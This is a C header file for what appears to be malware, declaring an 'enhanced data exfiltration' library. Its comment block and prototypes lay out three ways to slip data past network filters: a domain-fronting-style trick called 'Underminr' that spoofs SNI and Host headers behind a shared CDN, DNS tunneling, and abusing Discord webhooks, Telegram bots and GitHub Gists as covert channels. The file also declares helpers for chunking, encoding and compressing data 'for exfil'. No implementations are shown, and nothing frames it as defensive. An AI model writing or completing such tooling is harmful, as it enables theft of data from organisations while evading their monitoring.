#ifndef JOCKY_ENHANCED_EXFILTRATION_H
#define JOCKY_ENHANCED_EXFILTRATION_H

#include <stdint.h>
#include <stddef.h>

/* Enhanced Data Exfiltration Techniques
 *
 * Multiple methods to evade modern detection systems:
 *
 * 1. Underminr (2026 technique)
 *    - DNS lookup to allowed/whitelisted domain
 *    - Resolves to shared CDN IP (Azure, Cloudflare, etc.)
 *    - TLS SNI field contains blocked destination
 *    - HTTP Host header also contains blocked destination
 *    - Cross-tenant routing exploits CDN configuration
 *    - Bypasses IP-based and domain-based filtering
 *
 * 2. DNS Tunneling
 *    - Data encoded in DNS queries/responses
 *    - Uses DNS (port 53) which is rarely blocked
 *    - Covert channel via DNS resolver
 *
 * 3. API Abuse
 *    - Legitimate services as C2 channels
 *    - Discord webhooks, Telegram Bot API
 *    - GitHub Gist API, Pastebin, etc.
 *    - Data embedded in seemingly innocent API calls
 */

typedef enum {
    EXFIL_METHOD_UNDERMINR,      /* DNS to allowed domain + SNI spoofing */
    EXFIL_METHOD_DNS_TUNNEL,     /* DNS query/response encoding */
    EXFIL_METHOD_DISCORD,        /* Discord webhook API */
    EXFIL_METHOD_TELEGRAM,       /* Telegram Bot API */
    EXFIL_METHOD_GITHUB,         /* GitHub Gist API */
    EXFIL_METHOD_HYBRID          /* Auto-select based on availability */
} EXFIL_METHOD;

typedef struct {
    EXFIL_METHOD method;
    char primary_domain[256];      /* Whitelisted domain for Underminr */
    char sni_domain[256];          /* Blocked domain in SNI */
    char host_header[256];         /* Host header override */
    int port;                      /* Connection port (443 for HTTPS) */
} UNDERMINR_CONFIG;

typedef struct {
    char dns_server[256];          /* DNS resolver IP */
    int chunk_size;                /* Bytes per DNS query */
    int encoding_type;             /* Base32, Base64, etc. */
} DNS_TUNNEL_CONFIG;

typedef struct {
    char api_key[512];             /* API token or webhook URL */
    char channel_id[256];          /* Discord/Telegram channel ID */
    int chunk_size;
} API_ABUSE_CONFIG;

/* Underminr Technique */

int jocky_underminr_init(
    const char* whitelisted_domain,
    const char* blocked_destination,
    UNDERMINR_CONFIG* out_config
);

int jocky_underminr_resolve_cdn(
    const char* whitelisted_domain,
    char* out_cdn_ip,
    int ip_len
);

int jocky_underminr_connect(
    const UNDERMINR_CONFIG* config,
    void** out_handle
);

int jocky_underminr_send_data(
    void* handle,
    const uint8_t* data,
    int data_size
);

int jocky_underminr_close(void* handle);

/* DNS Tunneling */

int jocky_dns_tunnel_init(
    const char* dns_server,
    DNS_TUNNEL_CONFIG* out_config
);

int jocky_dns_tunnel_send(
    const DNS_TUNNEL_CONFIG* config,
    const char* domain_base,
    const uint8_t* data,
    int data_size
);

int jocky_dns_tunnel_recv(
    const DNS_TUNNEL_CONFIG* config,
    const char* domain_base,
    uint8_t* out_data,
    int max_size,
    int* out_received
);

/* API Abuse Methods */

int jocky_discord_exfil(
    const char* webhook_url,
    const uint8_t* data,
    int data_size,
    int chunk_size
);

int jocky_telegram_exfil(
    const char* bot_token,
    const char* chat_id,
    const uint8_t* data,
    int data_size,
    int chunk_size
);

int jocky_github_exfil(
    const char* github_token,
    const char* gist_id,
    const uint8_t* data,
    int data_size
);

/* Hybrid Method - Auto-detect best available */

typedef int (*exfil_callback_t)(const uint8_t* chunk, int size, void* context);

int jocky_hybrid_exfil(
    const uint8_t* data,
    int data_size,
    exfil_callback_t method_selector,
    void* context
);

/* Utility Functions */

int jocky_encode_data_base32(
    const uint8_t* input,
    int input_size,
    char* output,
    int output_size
);

int jocky_encode_data_base64(
    const uint8_t* input,
    int input_size,
    char* output,
    int output_size
);

int jocky_split_into_chunks(
    const uint8_t* data,
    int data_size,
    int chunk_size,
    uint8_t** out_chunks,
    int* out_chunk_count
);

int jocky_compress_for_exfil(
    const uint8_t* input,
    int input_size,
    uint8_t* output,
    int* output_size
);

#endif
